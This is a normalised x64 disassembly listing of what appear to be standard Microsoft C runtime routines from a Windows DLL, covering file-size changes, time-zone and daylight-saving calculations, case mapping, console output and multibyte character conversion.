lea r8d [ rdi + 0x1 ]
mov esi ecx
call sub_18000f6ec
mov r13 rax
cmp rax 0xffffffffffffffff
je r-xdata
call sub_1800075a8
mov eax [ rax ]
lea r8d [ rdi + 0x2 ]
xor edx edx
mov ecx esi
call sub_18000f6ec
cmp rax 0xffffffffffffffff
je r-xdata
mov rbx rbp
sub rbx rax
cmp rbx rdi
jle r-xdata
jge r-xdata
call [ GetProcessHeap@IAT ]
mov r15d 0x1000
lea edx [ rdi + 0x8 ]
mov rcx rax
mov r8 r15
call [ HeapAlloc@IAT ]
mov rbp rax
cmp rax rdi
jne r-xdata
xor r8d r8d
mov rdx r13
mov ecx esi
call sub_18000f6ec
cmp rax 0xffffffffffffffff
je r-xdata
xor r8d r8d
mov rdx rbp
mov ecx esi
call sub_18000f6ec
cmp rax 0xffffffffffffffff
je r-xdata
mov edx 0x8000
mov ecx esi
call sub_180010648
mov r12d eax
call sub_1800075a8
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov ecx esi
call sub_18000fe4c
mov rcx rax
call [ SetEndOfFile@IAT ]
neg eax
sbb rdi rdi
neg rdi
dec rdi
cmp rdi 0xffffffffffffffff
jne r-xdata
call sub_1800075c8
cmp [ rax ] 0x5
jne r-xdata
cdqe
sub rbx rax
cmp rbx rdi
jle r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r15
pop r13
pop r12
retn
call sub_1800075a8
mov [ rax ] 0xd
call sub_1800075c8
mov rbx rax
call [ GetLastError@IAT ]
mov [ rbx ] eax
or rdi 0xffffffffffffffff
call sub_1800075a8
mov [ rax ] 0xd
mov edx r12d
mov ecx esi
call sub_180010648
call [ GetProcessHeap@IAT ]
mov r8 rbp
mov rcx rax
xor edx edx
call [ HeapFree@IAT ]
jmp r-xdata
jmp r-xdata
cmp rdi 0xffffffffffffffff
je r-xdata
mov r8d ebx
cmp rbx r15
mov rdx rbp
cmovge r8d r15d
mov ecx esi
call sub_18000b098
cmp eax 0xffffffff
je r-xdata
sub_1800105b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
movsxd rbx ecx
mov edi r8d
mov esi edx
mov ecx ebx
call sub_18000fe4c
cmp rax 0xffffffffffffffff
jne r-xdata
mov r9d edi
xor r8d r8d
mov edx esi
mov rcx rax
call [ SetFilePointer@IAT ]
mov edi eax
cmp eax 0xffffffff
jne r-xdata
call sub_1800075a8
mov [ rax ] 0x9
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
mov rax rbx
lea rdx [ rw-data ]
sar rax 0x5
and ecx 0x1f
mov rax [ rdx + rax * 8 ]
imul rcx rcx 0x58
and [ rax + rcx + 0x8 ] 0xfd
mov eax edi
mov ecx eax
call sub_1800075e8
jmp r-xdata
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
sub_180010648
mov [ rsp + 0x8 ] rbx
movsxd r8 ecx
lea rbx [ rw-data ]
mov r9 r8
and r8d 0x1f
sar r9 0x5
imul r8 r8 0x58
mov rcx [ rbx + r9 * 8 ]
mov al [ rcx + r8 + 0x38 ]
movzx r11d [ rcx + r8 + 0x8 ]
add al al
and r11d 0x80
movsx r10d al
sar r10d 0x1
cmp edx 0x4000
je r-xdata
or [ rcx + r8 + 0x8 ] 0x80
mov rcx [ rbx + r9 * 8 ]
and [ rcx + r8 + 0x38 ] 0x80
cmp edx 0x8000
je r-xdata
neg r10d
sbb eax eax
and eax 0xc000
add eax 0x4000
mov eax 0x8000
jmp r-xdata
and [ rcx + r8 + 0x8 ] 0x7f
jmp r-xdata
cmp edx 0x10000
je r-xdata
mov rbx [ rsp + 0x8 ]
retn
test r11d r11d
jne r-xdata
or [ rcx + r8 + 0x8 ] 0x80
mov rax [ rbx + r9 * 8 ]
and [ rax + r8 + 0x38 ] 0x82
or [ rax + r8 + 0x38 ] 0x2
jmp r-xdata
cmp edx 0x20000
je r-xdata
cmp edx 0x40000
jne r-xdata
or [ rcx + r8 + 0x8 ] 0x80
mov rax [ rbx + r9 * 8 ]
and [ rax + r8 + 0x38 ] 0x81
or [ rax + r8 + 0x38 ] 0x1
jmp r-xdata
sub_180010718
sub rsp 0x38
test rcx rcx
jne r-xdata
mov eax [ rw-data ]
mov [ rcx ] eax
xor eax eax
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
mov eax 0x16
jmp r-xdata
add rsp 0x38
retn
sub_180010758
mov rax rsp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
xor r14d r14d
mov r13d r14d
mov esi r14d
mov [ rax + 0x8 ] r14d
mov [ rax + 0x10 ] r14d
mov [ rax + 0x18 ] r14d
lea ecx [ r14 + 0x7 ]
call sub_18000bc50
nop
call sub_180011298
mov r12 rax
lea rcx [ rsp + 0x90 ]
call sub_180011240
cmp eax r14d
je r-xdata
lea rcx [ rsp + 0x98 ]
call sub_1800111c0
cmp eax r14d
je r-xdata
mov [ rsp + 0x20 ] r14
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
lea rcx [ rsp + 0xa0 ]
call sub_180011200
cmp eax r14d
je r-xdata
mov [ rsp + 0x20 ] r14
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
call sub_18001230c
mov ebx eax
mov [ rw-data ] r14d
or r15d 0xffffffff
mov [ rw-data ] r15d
mov [ rw-data ] r15d
lea rcx [ r--data ]
call sub_180012a88
mov rdi rax
mov [ rsp + 0x40 ] rax
cmp rax r14
je r-xdata
mov [ rsp + 0x20 ] r14
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
mov rcx [ rw-data ]
cmp rcx r14
je r-xdata
cmp [ rax ] r14b
je r-xdata
lea rcx [ rw-data ]
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
call sub_180004690
mov [ rw-data ] r14
mov rcx [ rw-data ]
cmp rcx r14
je r-xdata
mov esi 0x1
mov [ rw-data ] 0x1
mov ecx [ rw-data ]
imul ecx ecx 0x3c
mov [ rsp + 0x90 ] ecx
cmp [ rw-data ] r14w
je r-xdata
cmp rcx r14
je r-xdata
mov rdx rcx
mov rcx rax
call sub_18000fc40
cmp eax r14d
jne r-xdata
add rsp 0x50
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov r15d 0x3
mov r9 r15
mov r8 rdi
lea edx [ r15 + 0x3d ]
mov rcx [ r12 ]
call sub_18000f550
cmp eax r14d
je r-xdata
mov edx [ rw-data ]
mov edx [ rw-data ]
mov eax edx
imul eax eax 0x3c
add ecx eax
mov [ rsp + 0x90 ] ecx
jmp r-xdata
mov rcx rdi
call sub_18000d180
lea rcx [ rax + 0x1 ]
call sub_180006ad0
mov [ rw-data ] rax
cmp rax r14
jne r-xdata
call sub_180004690
mov rcx [ rw-data ]
lea esi [ r15 + 0x2 ]
jmp r-xdata
add rdi r15
cmp [ rdi ] 0x2d
jne r-xdata
mov [ rsp + 0x20 ] r14
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
mov [ rsp + 0x98 ] r14d
mov [ rsp + 0xa0 ] r14d
mov eax [ rw-data ]
cmp eax r14d
je r-xdata
cmp [ rw-data ] r14w
je r-xdata
mov rcx rdi
call sub_18000d180
mov r8 rdi
lea rdx [ rax + 0x1 ]
mov rcx [ rw-data ]
call sub_18000f628
cmp eax r14d
je r-xdata
mov esi 0x1
jmp r-xdata
mov ebx [ rsp + 0x90 ]
call sub_180011290
mov [ rax ] ebx
mov ebx [ rsp + 0x98 ]
call sub_180011280
mov [ rax ] ebx
mov ebx [ rsp + 0xa0 ]
call sub_180011288
mov [ rax ] ebx
mov ecx 0x7
call sub_18000bb50
cmp esi r14d
jne r-xdata
mov rcx rdi
call sub_180006268
mov r11d eax
imul r11d r11d 0xe10
mov [ rsp + 0x90 ] r11d
mov bl 0x30
mov sil 0x39
mov r13d 0x1
inc rdi
mov rax [ r12 ]
mov [ rax ] r14b
cmp [ rsp + 0xa8 ] r14d
jne r-xdata
mov [ rsp + 0x98 ] 0x1
sub eax edx
imul eax eax 0x3c
mov [ rsp + 0xa0 ] eax
jmp r-xdata
mov [ rsp + 0x20 ] r14
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
jmp r-xdata
inc rdi
jmp r-xdata
cmp al bl
jl r-xdata
mov rax [ r12 + 0x8 ]
mov [ rax ] r14b
cmp [ rsp + 0xa8 ] r14d
jne r-xdata
mov rax [ r12 ]
mov [ rax + 0x3f ] r14b
jmp r-xdata
lea rax [ rsp + 0xa8 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] r14
mov esi 0x3f
mov [ rsp + 0x28 ] esi
mov rax [ r12 ]
mov [ rsp + 0x20 ] rax
mov r9d r15d
lea r8 [ rw-data ]
xor edx edx
mov ecx ebx
call [ WideCharToMultiByte@IAT ]
cmp eax r14d
je r-xdata
mov al [ rdi ]
cmp al 0x2b
je r-xdata
cmp [ rdi ] 0x3a
jne r-xdata
cmp al sil
jle r-xdata
mov rax [ r12 + 0x8 ]
mov [ rax + 0x3f ] r14b
jmp r-xdata
lea rax [ rsp + 0xa8 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x28 ] esi
mov rax [ r12 + 0x8 ]
mov [ rsp + 0x20 ] rax
mov r9d r15d
lea r8 [ rw-data ]
xor edx edx
mov ecx ebx
call [ WideCharToMultiByte@IAT ]
cmp eax r14d
je r-xdata
cmp r13d r14d
je r-xdata
inc rdi
mov rcx rdi
call sub_180006268
imul eax eax 0x3c
mov r11d [ rsp + 0x90 ]
add r11d eax
mov [ rsp + 0x90 ] r11d
mov al [ rdi ]
cmp al bl
jl r-xdata
movsx eax [ rdi ]
mov [ rsp + 0x98 ] eax
cmp eax r14d
je r-xdata
neg r11d
mov [ rsp + 0x90 ] r11d
cmp [ rdi ] 0x3a
jne r-xdata
cmp al sil
jg r-xdata
mov rax [ r12 + 0x8 ]
mov [ rax ] r14b
mov r9 r15
mov r8 rdi
mov edx 0x40
mov rcx [ r12 + 0x8 ]
call sub_18000f550
cmp eax r14d
je r-xdata
inc rdi
mov rcx rdi
call sub_180006268
mov r11d [ rsp + 0x90 ]
add r11d eax
mov [ rsp + 0x90 ] r11d
mov al [ rdi ]
cmp al bl
jl r-xdata
inc rdi
mov al [ rdi ]
cmp al bl
jge r-xdata
mov ebx [ rsp + 0x90 ]
call sub_180011290
mov [ rax ] ebx
mov ebx [ rsp + 0x98 ]
call sub_180011280
mov [ rax ] ebx
jmp r-xdata
mov [ rsp + 0x20 ] r14
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
jmp r-xdata
cmp al sil
jg r-xdata
inc rdi
mov al [ rdi ]
cmp al bl
jge r-xdata
sub_180010bf8
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x30
and [ rsp + 0x50 ] 0x0
mov ebx r8d
cmp edx 0x1
mov eax ebx
mov r12d ecx
mov edi 0x51eb851f
cdq
jne r-xdata
and edx 0x3
add eax edx
and eax 0x3
cmp eax edx
jne r-xdata
and edx 0x3
lea ebp [ rdx + rax ]
and ebp 0x3
sub ebp edx
jne r-xdata
lea ecx [ r8 + 0x76c ]
mov eax edi
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
imul edx edx 0x190
cmp ecx edx
je r-xdata
mov eax edi
imul ebx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
imul edx edx 0x64
cmp ebx edx
jne r-xdata
lea ecx [ r8 + 0x76c ]
mov eax edi
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
imul edx edx 0x190
cmp ecx edx
je r-xdata
mov eax edi
imul ebx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
imul edx edx 0x64
cmp ebx edx
jne r-xdata
lea r11 [ __dos_header ]
movsxd rax r9d
mov r10d [ r11 + rax * 4 + 0x1d30c ]
lea r11 [ __dos_header ]
movsxd rax r9d
mov r10d [ r11 + rax * 4 + 0x1d344 ]
jmp r-xdata
lea r11 [ __dos_header ]
movsxd rsi r9d
mov r10d [ r11 + rsi * 4 + 0x1d30c ]
lea r11 [ __dos_header ]
movsxd rsi r9d
mov r10d [ r11 + rsi * 4 + 0x1d344 ]
jmp r-xdata
lea rcx [ rsp + 0x50 ]
mov [ rw-data ] r10d
mov [ rw-data ] eax
call sub_180011200
test eax eax
je r-xdata
mov [ rw-data ] r10d
mov [ rw-data ] eax
mov [ rw-data ] ebx
jmp r-xdata
add r10d [ rsp + 0x80 ]
add r10d eax
lea r10d [ r10 + rax - 0x7 ]
jmp r-xdata
dec r8d
lea ecx [ rbx + 0x12b ]
mov eax edi
inc r10d
imul ecx
mov r9d edx
sar r9d 0x7
mov eax r9d
shr eax 0x1f
add r9d eax
mov eax edi
imul r8d
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax r8d
sub r9d edx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea ecx [ r10 + rax ]
mov eax ebx
add ecx r9d
imul eax eax 0x16d
lea r8d [ rax + rcx - 0x63db ]
mov ecx [ rsp + 0x70 ]
mov eax 0x92492493
imul r8d
add edx r8d
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
mov eax ecx
imul edx edx 0x7
imul eax eax 0x7
sub r8d edx
mov edx [ rsp + 0x78 ]
sub eax r8d
add eax edx
cmp r8d edx
jg r-xdata
mov ecx [ rw-data ]
mov eax [ rsp + 0x50 ]
imul eax eax 0x3e8
add ecx eax
mov eax 0x5265c00
mov [ rw-data ] ecx
jns r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
mov rbx [ rsp + 0x58 ]
mov rbp [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov eax [ rsp + 0x88 ]
imul eax eax 0x3c
add eax [ rsp + 0x90 ]
imul eax eax 0x3c
add eax [ rsp + 0x98 ]
imul eax eax 0x3e8
add eax [ rsp + 0xa0 ]
cmp r12d 0x1
jne r-xdata
test ebp ebp
jne r-xdata
cmp ecx 0x5
jne r-xdata
cmp ecx eax
jl r-xdata
add ecx eax
dec [ rw-data ]
jmp r-xdata
lea ecx [ rbx + 0x76c ]
mov eax edi
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
imul edx edx 0x190
cmp ecx edx
je r-xdata
mov eax edi
imul ebx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add edx ecx
imul edx edx 0x64
cmp ebx edx
jne r-xdata
mov [ rw-data ] ebx
sub ecx eax
inc [ rw-data ]
mov [ rw-data ] ecx
mov eax [ r11 + rsi * 4 + 0x1d310 ]
mov eax [ r11 + rsi * 4 + 0x1d348 ]
jmp r-xdata
sub r10d 0x7
jmp r-xdata
cmp r10d eax
jle r-xdata
sub_180010eb0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x60
mov rdi rcx
lea rcx [ rax + 0x10 ]
xor ebx ebx
mov [ rax + 0x10 ] ebx
call sub_1800111c0
cmp eax ebx
je r-xdata
cmp [ rsp + 0x88 ] ebx
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rbx
call sub_180008408
mov esi [ rdi + 0x14 ]
mov r13d 0x1
cmp esi [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp esi [ rw-data ]
je r-xdata
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
cmp esi 0x6b
mov eax 0x2
mov r12d r13d
lea r9d [ rax + 0x1 ]
lea ebp [ rax + 0x9 ]
jge r-xdata
movzx ecx [ rw-data ]
movzx eax [ rw-data ]
movzx edx [ rw-data ]
movzx r9d [ rw-data ]
mov [ rsp + 0x50 ] eax
mov [ rsp + 0x48 ] ecx
mov [ rsp + 0x40 ] edx
mov ecx r13d
cmp [ rw-data ] bx
jne r-xdata
mov edx [ rw-data ]
mov r8d [ rw-data ]
mov ecx [ rdi + 0x1c ]
cmp edx r8d
jge r-xdata
mov [ rsp + 0x50 ] ebx
mov [ rsp + 0x48 ] ebx
mov [ rsp + 0x40 ] ebx
mov [ rsp + 0x38 ] 0x2
mov [ rsp + 0x30 ] ebx
mov r8d esi
mov edx r13d
mov ecx r13d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] eax
call sub_180010bf8
mov r8d [ rdi + 0x14 ]
mov [ rsp + 0x50 ] ebx
mov [ rsp + 0x48 ] ebx
mov [ rsp + 0x40 ] ebx
mov [ rsp + 0x38 ] 0x2
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] r12d
mov r9d ebp
xor ecx ecx
lea r9d [ rax + 0x2 ]
mov eax r13d
lea ebp [ r9 + 0x6 ]
lea r12d [ r9 + 0x1 ]
movzx r8d [ rw-data ]
movzx r10d [ rw-data ]
xor edx edx
mov [ rsp + 0x38 ] r8d
mov [ rsp + 0x30 ] r10d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] ebx
movzx r10d [ rw-data ]
movzx r11d [ rw-data ]
movzx r8d [ rw-data ]
mov [ rsp + 0x38 ] r10d
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] r11d
mov [ rsp + 0x20 ] r8d
mov edx r13d
jmp r-xdata
cmp ecx r8d
jl r-xdata
cmp ecx edx
jl r-xdata
movzx r10d [ rw-data ]
xor edx edx
mov [ rsp + 0x30 ] r10d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] ebx
jmp r-xdata
movzx r10d [ rw-data ]
movzx r11d [ rw-data ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] r10d
mov [ rsp + 0x20 ] r11d
jmp r-xdata
mov r8d esi
call sub_180010bf8
movzx ecx [ rw-data ]
movzx r8d [ rw-data ]
movzx eax [ rw-data ]
movzx edx [ rw-data ]
movzx r9d [ rw-data ]
mov [ rsp + 0x50 ] eax
mov [ rsp + 0x48 ] ecx
mov [ rsp + 0x40 ] edx
xor ecx ecx
mov [ rsp + 0x38 ] r8d
mov r8d [ rdi + 0x14 ]
cmp [ rw-data ] bx
jne r-xdata
mov eax r13d
cmp ecx edx
jg r-xdata
cmp ecx r8d
jg r-xdata
call sub_180010bf8
mov edx r13d
cmp ecx r8d
jle r-xdata
cmp ecx edx
jle r-xdata
mov eax [ rdi + 0x8 ]
imul eax eax 0x3c
add eax [ rdi + 0x4 ]
imul eax eax 0x3c
add eax [ rdi ]
imul eax eax 0x3e8
cmp ecx edx
jne r-xdata
cmp ecx edx
jl r-xdata
cmp ecx r8d
jge r-xdata
cmp eax [ rw-data ]
setl bl
jmp r-xdata
cmp eax [ rw-data ]
setge bl
mov eax ebx
jmp r-xdata
sub_180011154
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
add rsp 0x28
retn
mov ecx 0x6
call sub_18000bc50
nop
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x6
call sub_18000bb50
call sub_180010758
inc [ rw-data ]
sub_180011190
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0x6
call sub_18000bc50
nop
mov rcx rbx
call sub_180010eb0
mov ebx eax
mov ecx 0x6
call sub_18000bb50
mov eax ebx
add rsp 0x20
pop rbx
retn
sub_1800111c0
sub rsp 0x38
test rcx rcx
jne r-xdata
mov eax [ rw-data ]
mov [ rcx ] eax
xor eax eax
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
mov eax 0x16
jmp r-xdata
add rsp 0x38
retn
sub_180011200
sub rsp 0x38
test rcx rcx
jne r-xdata
mov eax [ rw-data ]
mov [ rcx ] eax
xor eax eax
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
mov eax 0x16
jmp r-xdata
add rsp 0x38
retn
sub_180011240
sub rsp 0x38
test rcx rcx
jne r-xdata
mov eax [ rw-data ]
mov [ rcx ] eax
xor eax eax
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
mov eax 0x16
jmp r-xdata
add rsp 0x38
retn
sub_1800112a0
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x70
movsxd rdi ecx
lea rcx [ rsp + 0x50 ]
call sub_180005710
cmp edi 0x100
jae r-xdata
mov rax [ rsp + 0x50 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov r8 [ rsp + 0x50 ]
cmp [ r8 + 0x10c ] 0x1
jle r-xdata
call sub_1800075a8
mov edx 0x1
mov [ rax ] 0x2a
mov [ rsp + 0x80 ] dil
mov [ rsp + 0x81 ] 0x0
mov esi edi
lea rdx [ rsp + 0x50 ]
sar esi 0x8
movzx ecx sil
call sub_1800057bc
test eax eax
je r-xdata
mov rax [ r8 + 0x140 ]
movzx eax [ rax + rdi * 2 ]
and eax 0x2
lea r8 [ rsp + 0x50 ]
mov edx 0x2
mov ecx edi
call sub_18001255c
mov r8 [ rsp + 0x50 ]
jmp r-xdata
cmp [ rsp + 0x68 ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ rsp + 0x90 ]
je r-xdata
mov [ rsp + 0x80 ] sil
mov [ rsp + 0x81 ] dil
mov [ rsp + 0x82 ] 0x0
mov edx 0x2
jmp r-xdata
mov rax [ r8 + 0x150 ]
movzx eax [ rax + rdi ]
jmp r-xdata
test eax eax
je r-xdata
mov eax edi
jmp r-xdata
mov rax [ rsp + 0x60 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x68 ] 0x0
je r-xdata
movzx ecx [ rsp + 0x91 ]
shl eax 0x8
or eax ecx
mov rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] 0x1
lea r9 [ rsp + 0x80 ]
mov eax [ rcx + 0x4 ]
mov r8d 0x200
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x90 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] edx
mov edx [ rcx + 0x14 ]
lea rcx [ rsp + 0x50 ]
call sub_180011cb0
test eax eax
je r-xdata
mov rsi [ rsp + 0x88 ]
add rsp 0x70
pop rdi
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180011414
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
call sub_1800112a0
lea eax [ rcx - 0x61 ]
cmp eax 0x19
ja r-xdata
mov eax ecx
jmp r-xdata
add ecx 0xffffffe0
add rsp 0x28
retn
sub_18001143c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
sub rsp 0x50
mov esi edx
mov rdx rcx
lea rcx [ rax - 0x28 ]
mov rbx r9
mov edi r8d
call sub_180005710
mov r9d [ rsp + 0x80 ]
xor ebp ebp
cmp r9d ebp
jle r-xdata
mov eax [ rsp + 0x90 ]
mov r8 rbx
mov edx edi
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x88 ]
mov ecx esi
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
cmp [ rsp + 0x48 ] bpl
je r-xdata
mov eax r9d
mov rcx rbx
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub r9d eax
dec r9d
add rcx 0x2
cmp eax ebp
jne r-xdata
dec eax
cmp [ rcx ] bp
je r-xdata
or eax 0xffffffff
sub_1800114e0
sub rsp 0x68
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
cmp [ rw-data ] 0x0
mov [ rsp + 0x40 ] cx
je r-xdata
call [ GetConsoleOutputCP@IAT ]
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov ecx eax
lea rax [ rsp + 0x48 ]
lea r8 [ rsp + 0x40 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] 0x5
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
mov rcx [ rw-data ]
cmp rcx 0xfffffffffffffffe
jne r-xdata
mov eax 0xffff
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x44 ]
lea rdx [ rsp + 0x48 ]
mov r8d eax
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
cmp rcx 0xffffffffffffffff
je r-xdata
call sub_180012b2c
mov rcx [ rw-data ]
mov ax [ rsp + 0x40 ]
jmp r-xdata
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x44 ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x1
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_1800042d0
add rsp 0x68
retn
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
and [ rw-data ] 0x0
sub_1800115f4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x50
xor ebp ebp
mov rsi r8
mov rdi rdx
mov rbx rcx
cmp rdx rbp
je r-xdata
xor eax eax
cmp r8 rbp
je r-xdata
cmp [ rdx ] bpl
jne r-xdata
lea rcx [ rsp + 0x30 ]
mov rdx r9
call sub_180005710
mov r11 [ rsp + 0x30 ]
cmp [ r11 + 0x14 ] ebp
jne r-xdata
cmp rcx rbp
je r-xdata
movzx ecx [ rdi ]
lea rdx [ rsp + 0x30 ]
call sub_1800057bc
cmp eax ebp
je r-xdata
cmp rbx rbp
je r-xdata
mov [ rcx ] bp
mov eax ebp
mov r9d 0x1
cmp rbx rbp
setne al
lea edx [ r9 + 0x8 ]
mov r8 rdi
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rbx
mov ecx [ rax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebp
jne r-xdata
mov rcx [ rsp + 0x30 ]
mov r9d [ rcx + 0x10c ]
cmp r9d 0x1
jle r-xdata
cmp [ rsp + 0x48 ] bpl
je r-xdata
movzx eax [ rdi ]
mov [ rbx ] ax
jmp r-xdata
movsxd rax [ rcx + 0x10c ]
cmp rsi rax
jb r-xdata
cmp esi r9d
jl r-xdata
mov eax 0x1
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_1800075a8
mov [ rax ] 0x2a
cmp [ rsp + 0x48 ] bpl
je r-xdata
cmp [ rdi + 0x1 ] bpl
je r-xdata
mov ecx [ rcx + 0x4 ]
mov eax ebp
cmp rbx rbp
setne al
mov r8 rdi
mov edx 0x9
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
mov rcx [ rsp + 0x30 ]
cmp eax ebp
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
or eax 0xffffffff
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
mov eax [ rcx + 0x10c ]
cmp [ rsp + 0x48 ] bpl
je r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_180011770
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x60
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x50 ] rbx
mov [ rbp + 0x58 ] rsi
mov [ rbp + 0x60 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x18 ] rax
mov r10d [ rw-data ]
mov esi 0x2
xor edi edi
mov r11 r9
mov [ rbp + 0x10 ] r9
mov [ rbp ] r8d
mov r14d edx
mov [ rbp + 0x8 ] edx
mov rbx rcx
lea r13d [ rsi - 0x1 ]
cmp r10d edi
jne r-xdata
mov r9d [ rbp + 0x70 ]
cmp r9d edi
jle r-xdata
lea r8 [ r--data ]
mov r9d r13d
mov edx 0x100
xor ecx ecx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
call [ LCMapStringW@IAT ]
cmp eax edi
je r-xdata
cmp r10d esi
je r-xdata
mov ecx r9d
mov rax r11
call [ GetLastError@IAT ]
mov r10d [ rw-data ]
